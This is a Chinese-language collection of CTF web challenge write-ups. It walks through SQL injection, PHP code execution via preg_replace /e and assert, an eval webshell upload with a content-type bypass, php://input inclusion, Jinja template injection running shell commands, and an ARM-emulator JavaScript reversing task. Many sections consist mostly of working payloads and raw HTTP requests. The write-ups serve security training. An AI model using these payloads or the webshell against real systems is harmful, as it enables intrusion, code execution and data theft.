# Web Challenge Area

## 0x01 Cat

%df 宽字节报错

> mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来。

查库文件地址 

```
          <td class="code"><pre>{&#39;default&#39;: {&#39;ATOMIC_REQUESTS&#39;: False,
             &#39;AUTOCOMMIT&#39;: True,
             &#39;CONN_MAX_AGE&#39;: 0,
             &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,
             &#39;HOST&#39;: &#39;&#39;,
             &#39;NAME&#39;: &#39;/opt/api/database.sqlite3&#39;,
             &#39;OPTIONS&#39;: {},
             &#39;PASSWORD&#39;: u&#39;********************&#39;,
             &#39;PORT&#39;: &#39;&#39;,
             &#39;TEST&#39;: {&#39;CHARSET&#39;: None,
                      &#39;COLLATION&#39;: None,
                      &#39;MIRROR&#39;: None,
                      &#39;NAME&#39;: None},
             &#39;TIME_ZONE&#39;: None,
             &#39;USER&#39;: &#39;&#39;}}</pre></td>
```

用@读sql文件

>| **`CURLOPT_POSTFIELDS`** | 全部数据使用HTTP协议中的 "POST" 操作来发送。 要发送文件，在文件名前面加上*@*前缀并使用完整路径。 文件类型可在文件名后以 '*;type=mimetype*' 的格式指定。 这个参数可以是 urlencoded 后的字符串，类似'*para1=val1&para2=val2&...*'，也可以使用一个以字段名为键值，字段数据为值的数组。 如果`value`是一个数组，*Content-Type*头将会被设置成*multipart/form-data*。 从 PHP 5.2.0 开始，使用 *@* 前缀传递文件时，`value` 必须是个数组。 从 PHP 5.5.0 开始, *@* 前缀已被废弃，文件可通过 [CURLFile](https://www.php.net/manual/zh/class.curlfile.php) 发送。 设置 **`CURLOPT_SAFE_UPLOAD`** 为 **`TRUE`** 可禁用 *@* 前缀发送文件，以增加安全性。 |
>| ------------------------ | ------------------------------------------------------------ |
>|                          |                                                              |

找flag

。。。。

## 0x02 ics-04

三个界面（注册，登陆，找回密码）跑了一下sqlmap

发现找回密码界面是可以的

用burp suite抓post包然后给sqlmap

```bash
sqlmap -r post.txt -p username --batch #看是否能注入
sqlmap -r post.txt -p username --dbs --batch#爆破库列表
sqlmap -r post.txt -p username -D cetc004 --tables --batch#爆破表
sqlmap -r post.txt -p username -D cetc004 -T user --columns --batch#爆破字段
sqlmap -r post.txt -p username -D cetc004 -T user -C "username,password"--dump --batch#爆破字段值
```

得到 

```
+-------------------------------------------+-------------+
| password                                  | username    |
+-------------------------------------------+-------------+
| 2f8667f381ff50ced6a3edc259260ba9          | cc3tlwDmIn23|
| 21232f297a57a5a743894a0e4a801fc3 (admin)  | admin       |
+-------------------------------------------+-------------+
```

其中admin是自己注册的。。。。

password md5加密。。。。。。

既然说注册页面也有bug,又把玩了一下注册逻辑

结果发现可以用户名可以重复。。。。。。

然后再注册一个cc3tlwDmIn23登陆就完事了

## 0x03 ics-05

一开始找不到注入的参数。。。。

点了一下标题找到了

试了一下发现可以直接回显要的东西，

比如page=index.php会返回ok

试一下伪协议读取index.php，

```
payload=?page=php://filter/read=convert.base64-encode/resource=index.php
```

得到源码

```
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
····
<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}





?>

</body>

</html>

```

preg_replace的三个参数都可控

然后可以用在pattern里/e修饰符来进行恶意代码执行

> 如果设置了这个被弃用的修饰符， [preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php) 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(*\*)和 NULL 字符在 后向引用替换时会被用反斜线转义. 

利用方法形如：

```
payload=?pat=/test/e&rep=phpinfo();&sub=test
```

注意要设置X-Forwarded-For请求头为127.0.0.1

构造payload找flag

```
?pat=/test/e&rep=system("find+/+-name+*flag*");
```

```
system("cat+/var/www/html/s3chahahaDir/flag/flag.php");
```

## 0x04 ics-06

id 爆破题。。。。。

id=2333的时候就行

好像也挺符合题面的？

## 0x05 lottery

题目给的附件就是网站的源码

不过好像也可以直接利用网站的git漏洞拿。。。。。

是一个lottery网站，根据对的数字个数赢得奖金，最后拿flag

看一下源码中比对的逻辑

```php
// my boss told me to use cryptographically secure algorithm 
function random_num(){
	do {
		$byte = openssl_random_pseudo_bytes(10, $cstrong);
		$num = ord($byte);
	} while ($num >= 250);

	if(!$cstrong){
		response_error('server need be checked, tell admin');
	}
	
	$num /= 25;
	return strval(floor($num));
}

function random_win_nums(){
	$result = '';
	for($i=0; $i<7; $i++){
		$result .= random_num();
	}
	return $result;
}
function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
    .....
}
```

一开始看注释以为会不会是random_num的锅。。。

结果发现buy里面用的是“==”弱类型比较

然后似乎可以直接用true搞（json也支持bool量存储）

>  在PHP弱类型的比较中 true==[1-9]=="[1-9]"  

用Burp Suite 抓包修改为构造数组刷钱就行了

```html
Request
POST /api.php HTTP/1.1
Host: 111.198.29.45:39302
Content-Length: 63
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://111.198.29.45:39302
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
DNT: 1
Content-Type: application/json
Referer: http://111.198.29.45:39302/buy.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"action":"buy","numbers":[true,true,true,true,true,true,true]}

Response
HTTP/1.1 200 OK
Date: Mon, 18 Nov 2019 16:17:03 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.5
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 116
Connection: close
Content-Type: application/json

{"status":"ok","numbers":[true,true,true,true,true,true,true],"win_numbers":"0915821","money":200018,"prize":200000}
```

## 0x06 NewsCenter

第一道独立完整做出来的sql注入题，

算是一种套路吧。

题目给了一个搜索框，根据搜索内容显示新闻内容



首先尝试单引号，看看会不报错

```
1'
->
Error
```

结果真的报错了，但是显示服务器500错误，拿不到报错提示信息

但是应该可以确定就是单引号的报错了

尝试有没有回显点

先看看有几个回显点

```
1' order by 3#
->

1' order by 4#
->
Error
```

有三个

构造union查询

```
1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#
->
2
information_schema,news
```

可以正常回显

接下来就是套路了

根据查库接着查表

> 0x6E657773是"news"对应的hex值

```
1' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x6E657773 #
->
2
news,secret_table
```

发现有意思的表

然后查字段

```
1' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7365637265745F7461626C65 #
->
2
id,fl4g
```

拿flag

```
1' UNION SELECT 1,2,fl4g from secret_table #
->
2
QCTF{sq1_inJec7ion_ezzz}
```

## 0x07 mfw

翻About的时候看到用了git,应该是暗示git泄露了

然后Githacker一波搞到源码

有个flag.php flag应该是放在这里

看主要的index.php

```
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$page', '..') === false") or die("Detected hacking attempt!");
//', '..') === false") or die("Detected hacking attempt!不执行
// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```

>  assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, string `$description` ] ) : bool 
>
> 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。

然后和sql注入一样想办法拼接执行恶意语句

```
payload=233') or system("cat templates/flag.php");//
```
> 注意这里不用闭合后面的）因为assert把后面一串都当字符串处理，相当于//已经全都注释掉了（虽然编辑器高亮标不出来）

## 0x08 Training-WWW-Robots

就考一个Robots协议。。。。。。
直接读robots.txt就完事了

## 0x09  NaNNaNNaNNaN-Batman

。。。。。做的时候完全没有头绪
看了一下大佬的wp
eval()->alert()或者console.log来看解码后代码
```js
function $(){var e=document.getElementById("c").value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null){var t=["fl","s_a","i","e}"];var n=["a","_h0l","n"];var r=["g{","e","_0"];var i=["it'","_","n"];var s=[t,n,r,i];for(var o=0;o<13;++o){document.write(s[o%4][0]);s[o%4].splice(0,1)}}}document.write('<input id="c"><button onclick=$()>Ok</button>');delete _
```
虽然e拿来判断，但是和后面生成flag没啥关系

直接改一下判断条件输出flag

```
{{var t=["fl","s_a","i","e}"];var n=["a","_h0l","n"];var r=["g{","e","_0"];var i=["it'","_","n"];var s=[t,n,r,i];for(var o=0;o<13;++o){document.write(s[o%4][0]);s[o%4].splice(0,1)}}}
```

感觉出题人好巨

## 0x0A bug
玩了一下发现这个找回密码居然是分两部的
而且第二部直接明文传。。。。
直接上BurpSuite改包就完事了
登上去以后发现
IP Not allowed！
用Hackbar改一下XFF请求头
结果是个
Where Is The Flag?
。。。。
F12完了有个Hint
```hmtl
<!-- index.php?module=filemanage&do=???-->
```
但是直接交会显示action错误
卡半天。。。。
原来“经验丰富”的CTF选手应该联想到upload
。。。。。
然后进入一个upload界面
想交一个“一句话”的，结果被拦截了，似乎只能图片
那就00截断吧
但是好像用%00的方法没成功，最后还是在BurpSuite里改的
## 0x0B upload



## 0x0C FlatScience



## 0x0D web2

web上的逆向题.....

```
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function decode($chiper){
    $_=base64_decode(strrev(str_rot13($chiper)));
        
    for($_0=0;$_0<strlen($_);$_0++){
        $_c=substr($_,$_0,1);
        $__=ord($_c);
        $_c=chr($__-1);
        $_o=$_o.$_c;
    }
    
    $str=strrev($_o);
    return $str;
}

print(decode($miwen));
?>
```

## 0x0E PHP2

index.phps 源码泄露

```
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

对id参数两次URLENCODE

```
GET /index.php?id=%2561%2564%256d%2569%256e HTTP/1.1
Host: 111.198.29.45:39608
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

## 0x0F unserialize3

基础php反序列化

```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```

因为_wakeup()会直接exit

所以传一个坏的序列化对象就能得到flag了

> 一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数

比如

```
O:4:"xctf":2:{s:4:"flag";i:3;}
```

## 0x10 upload1

最经典的上传木马了

写个一句话脚本

```
<?php @eval($_POST[eki]);?>
```

因为只能上传图片，但是直接把content-type改了就能绕过了

```
POST /index.php HTTP/1.1
Host: 111.198.29.45:58220
Content-Length: 212
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Origin: http://111.198.29.45:58220
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuzacUTUZndq8dQSe
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://111.198.29.45:58220/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryuzacUTUZndq8dQSe
Content-Disposition: form-data; name="upfile"; filename="233.php"
Content-Type: image/jpeg

<?php @eval($_POST['eki']);?>
------WebKitFormBoundaryuzacUTUZndq8dQSe--
```

## 0x11 Triangle

F12看一下有四个脚本

secret.js,unicorn.js,util.js还有(index)里的js代码

先看index里的

```js
// toDataURL firefox vs chrome >:O
if(navigator.userAgent.toLowerCase().indexOf('firefox') > -1){
...//不知道是啥 应该是存数据的先不管。。。。


function login(){
	var input = document.getElementById('password').value;
	var enc = enc_pw(input);
	var pw = get_pw();
	if(test_pw(enc, pw) == 1){
		alert('Well done!');
	}
	else{
		alert('Try again ...');
	}
}
```

看起来是要想办法pw的值decode得到对应的flag（js逆向警告）

在secret.js里找到了这仨函数

```js
function test_pw(e, _) {
    var t = stoh(atob(getBase64Image("eye")))
      , r = 4096
      , m = 8192
      , R = 12288
      , a = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);
    a.reg_write_i32(uc.ARM_REG_R9, m),
    a.reg_write_i32(uc.ARM_REG_R10, R),
    a.reg_write_i32(uc.ARM_REG_R8, _.length),
    a.mem_map(r, 4096, uc.PROT_ALL);
    for (var o = 0; o < o1.length; o++)
        a.mem_write(r + o, [t[o1[o]]]);
    a.mem_map(m, 4096, uc.PROT_ALL),
    a.mem_write(m, stoh(_)),
    a.mem_map(R, 4096, uc.PROT_ALL),
    a.mem_write(R, stoh(e));
    var u = r
      , c = r + o1.length;
    return a.emu_start(u, c, 0, 0),
    a.reg_read_i32(uc.ARM_REG_R5)
}
function enc_pw(e) {
    var _ = stoh(atob(getBase64Image("frei")))
      , t = 4096
      , r = 8192
      , m = 12288
      , R = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);
    R.reg_write_i32(uc.ARM_REG_R8, r),
    R.reg_write_i32(uc.ARM_REG_R9, m),
    R.reg_write_i32(uc.ARM_REG_R10, e.length),
    R.mem_map(t, 4096, uc.PROT_ALL);
    for (var a = 0; a < o2.length; a++)
        R.mem_write(t + a, [_[o2[a]]]);
    R.mem_map(r, 4096, uc.PROT_ALL),
    R.mem_write(r, stoh(e)),
    R.mem_map(m, 4096, uc.PROT_ALL);
    var o = t
      , u = t + o2.length;
    return R.emu_start(o, u, 0, 0),
    htos(R.mem_read(m, e.length))
}
function get_pw() {
    for (var e = stoh(atob(getBase64Image("templar"))), _ = "", t = 0; t < o3.length; t++)
        _ += String.fromCharCode(e[o3[t]]);
    return _
}
```

这是啥。。。

看了一眼unicorn.js

>**Unicorn.js** is a port of the [Unicorn](http://www.unicorn-engine.org/) emulator framework for JavaScript, done with [Emscripten](https://github.com/kripken/emscripten). It's released as a 19 MB JavaScript file supporting the architectures: *ARM*, *ARM64*, *M68K*, *MIPS*, *SPARC*, and *x86*. Alternatively, per-platform Unicorn.js releases are also available [here](https://github.com/AlexAltea/unicorn.js/releases/). Follow the [Readme](https://github.com/AlexAltea/unicorn.js/blob/master/README.md) to build Unicorn.js manually.

> Unicorn is a lightweight multi-architecture CPU emulator framework originally developed by Nguyen Anh Quynh et al. and released under GPLv2.

居然是个模拟cpu的js。。。

官方给的教程

```js
ar addr = 0x10000;
var code = [
  0x37, 0x00, 0xA0, 0xE3,  // mov r0, #0x37
  0x03, 0x10, 0x42, 0xE0,  // sub r1, r2, r3
];

// Initialize engine
var e = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);

// Write registers and memory
e.reg_write_i32(uc.ARM_REG_R2, 0x456);
e.reg_write_i32(uc.ARM_REG_R3, 0x123);
e.mem_map(addr, 4*1024, uc.PROT_ALL);
e.mem_write(addr, code)

// Start emulator
var begin = addr;
var until = addr + code.length;
e.emu_start(begin, until, 0, 0);

// Read registers
var r0 = e.reg_read_i32(uc.ARM_REG_R0);  // 0x37
var r1 = e.reg_read_i32(uc.ARM_REG_R1);  // 0x333
```

待会估计要逆向汇编代码了。。。。。。。。

先分析一下enc_pw()

```js
function enc_pw(e) {
    var _ = stoh(atob(getBase64Image("frei")))
      , t = 4096//0x1000
      , r = 8192//0x2000
      , m = 12288//0x3000
      , R = new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);
    R.reg_write_i32(uc.ARM_REG_R8, r),
    R.reg_write_i32(uc.ARM_REG_R9, m),
    R.reg_write_i32(uc.ARM_REG_R10, e.length),
    R.mem_map(t, 4096, uc.PROT_ALL);
    for (var a = 0; a < o2.length; a++)
        R.mem_write(t + a, [_[o2[a]]]);//_[]里的东西写进R(CPU模拟器)的内存，应该就是armhex了
    R.mem_map(r, 4096, uc.PROT_ALL),
    R.mem_write(r, stoh(e)),
    R.mem_map(m, 4096, uc.PROT_ALL);
    var o = t
      , u = t + o2.length;
    return R.emu_start(o, u, 0, 0),
    htos(R.mem_read(m, e.length))
}
```

_[o2[a]]是hex代码,想办法把他搞出来

模仿enc_pw()构造个js

```js
function getARM1(){
  var x = stoh(atob(getBase64Image("frei")));
  var output = new Array();
  for(var i = 0; i < o2.length ; i++){
    output[i] = x[o2[i]];
  }
  return output;
} 

//Looking at o2, we observe that our output will be in integers. 
//Lets try converting them to hex values.

function toHexString(byteArray) {
  return Array.from(byteArray, function(byte) {
    return ('0' + (byte & 0xFF).toString(16)).slice(-2);
  }).join('')
}
```

调用一下

```js
toHexString(getARM1())
"0800a0e10910a0e10a20a0e10030a0e30050a0e30040d0e5010055e30100001a036003e2064084e0064084e2015004e20040c1e5010080e2011081e2013083e2020053e1f2ffffba0000a0e30010a0e30020a0e30030a0e30040a0e30050a0e30060a0e30070a0e30090a0e300a0a0e3"
```

这串应该就是汇编代码了，因为是i32,我们选择armv7-arm放进 http://armconverter.com/hextoarm/ 反编译，得到这么一串汇编源码

```assembly
MOV	R0, R8
MOV	R1, SB
MOV	R2, SL
MOV	R3, #0
MOV	R5, #0
LDRB	R4, [R0] 
;LDRB指令用于从存储器中将一个8位的字节数据传送到目的寄存器中，同时将寄存器的高24位清零。该指令通常用于从存储器中读取8位的字节数据到通用寄存器，然后对数据进行处理。当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当作目的地址，从而可以实现程序流程的跳转。
CMP	R5, #1
;CMP 比较指令做了减法运算以后，根据运算结果设置了各个标志位。
BNE	#0x28;相等则跳转（Branch if EQual）
AND	R6, R3, #3;R6=R3&#3
ADD	R4, R4, R6
ADD	R4, R4, #6;R4=R4+#6
AND	R5, R4, #1
STRB	R4, [R1]
;STRB指令用于从源寄存器中将一个8位的字节数据传送到存储器中。该字节数据为源寄存器中的低8位。
ADD	R0, R0, #1
ADD	R1, R1, #1
ADD	R3, R3, #1
CMP	R3, R2
BLT	#0x14
;Branch if Less Than 小于跳转
MOV	R0, #0
MOV	R1, #0
MOV	R2, #0
MOV	R3, #0
MOV	R4, #0
MOV	R5, #0
MOV	R6, #0
MOV	R7, #0
MOV	SB, #0
MOV	SL, #0
```

查资料把对应汇编指令的含义都写出来了

所以上面的代码差不多是这个意思(转自 https://lim1ts.github.io/ctf/2017/10/19/hackluTriangles.html )

```assembly
    ; FROM test_pw:

    MOV R0, SB       ; R0 = SB, Static base register. This is a synonym for R9. #R0 = R9 = m. (the secret password is here)
    MOV R1, SL       ; R1 = SL, Stack Limit register. This is a synonym for R10. #R1 = R10 = R (the input password is here)
    MOV R3, R8       ; R8 = input password length
    MOV R4, #0
    MOV R5, #0
    MOV IP, #0
    LDRB  R2, [R0]       ; Load secret password
    LDRB  R6, [R1]       ; Load input password 
    ADD R6, R6, #5       ; Will do +5
    AND IP, R4, #1       ; ip == R4 and 1
    CMP IP, #0           
    BEQ #0x34             ; Will jump when IP is 0, or rather when R4 is even 
    SUB R6, R6, #3        ; Will do -3 this when R4 is odd.
    CMP R2, R6            ; 0x34 here, if R4 is even, just compare.
    BNE #0x54             ; R2 needs == R6
    ADD R0, R0, #1
    ADD R1, R1, #1
    ADD R4, R4, #1        ; Increment all. R4 is a counter
    CMP R4, R3            ; Check if counter < input length
    BLT #0x18
    MOV R5, #1      ; We need this!
    MOV R0, #0      ; 0x54 here
    MOV R1, #0
    MOV R2, #0
    MOV R3, #0
    MOV R4, #0
    MOV R6, #0
    MOV R7, #0
    MOV R8, #0
    MOV SB, #0
    MOV SL, #0
    MOV IP, #0

    ; Repeating this with enc_pw give us ;
    ; FROM enc_pw:

    MOV R0, R8          ; R8 -> R0, R0 = 8192
    MOV R1, SB          ; R1 = SB, Static base register. This is a synonym for R9. #R1 = R9 = m. (we should read final result from here)
    MOV R2, SL          ; R2 = SL, Stack Limit register. This is a synonym for R10. #R2 = R10 = e.length (input length)
    MOV R3, #0
    MOV R5, #0
    LDRB  R4, [R0]      ; Load register byte. #0x14 here
    CMP R5, #1          ; IS R5 = 1? 
    BNE #0x28           
    AND R6, R3, #3      
    ADD R4, R4, R6
    ADD R4, R4, #6      ; 0x28 is here. If R5 is 0, come here
    AND R5, R4, #1      ; R5 == 1 if R4 is odd.
    STRB  R4, [R1]      ; store register byte
    ADD R0, R0, #1      
    ADD R1, R1, #1
    ADD R3, R3, #1
    CMP R3, R2
    BLT #0x14           ; Go back if R3 < input length. R3 is a counter
    MOV R0, #0
    MOV R1, #0
    MOV R2, #0
    MOV R3, #0
    MOV R4, #0
    MOV R5, #0
    MOV R6, #0
    MOV R7, #0
    MOV SB, #0
    MOV SL, #0    ; Repeating this with enc_pw give us ;
```

用js写成

```js
function findReqR6(){
  var pw = stoh("XYzaSAAX_PBssisodjsal_sSUVWZYYYb"); //We found this string above, from get_pw();
  var required = new Array();
  for(var i = 0 ; i < pw.length; i ++ ){
      var a = pw[i];
      a = a - 5;            // We do this to find out what the original input needs to be.
      if(i & 1 == 1){
        a = a + 3;          // Because the test adds 5, and might sub 2 in some cases
      }                     // according to the assembly above.
      required[i] = a;
  }
  return required;
}

function reverseEnc(argarray){
  var test = 0;
  var output = new Array();
  
  for(var i = 0 ; i < argarray.length ; i++){
    var x = argarray[i];
    if(test == 1){
      var sub = (i & 3);
      x = x - sub;      //Once again we find this by reading through the assembly.
    }
    x = x - 6;
    test = (argarray[i] & 1);
    output[i] = x;
  }
  return output;
}
```

跑一下即得到flag

```
htos(reverseEnc(findReqR6()))
"SWu_N?<VZN=qngnm_hn_g]nQPTRXTWT`"
```

## 0x12 wtf.sh-150



## 0x13 Web_php_include

“php://”被吃了

但是strstr()大小写敏感 协议大小写不敏感

直接PHP://input 一下

```
GET /?page=PHP://input HTTP/1.1
Host: 111.198.29.45:57474
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 44

<?php readfile("fl4gisisish3r3.php"); ?> //先ls扫一下目录
```

## 0x15 Web_python_template_injection

SSTI

直接/{{1+1}} 输出2，证明存在模板注入

payload

```
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat fl4g').read() }}
```

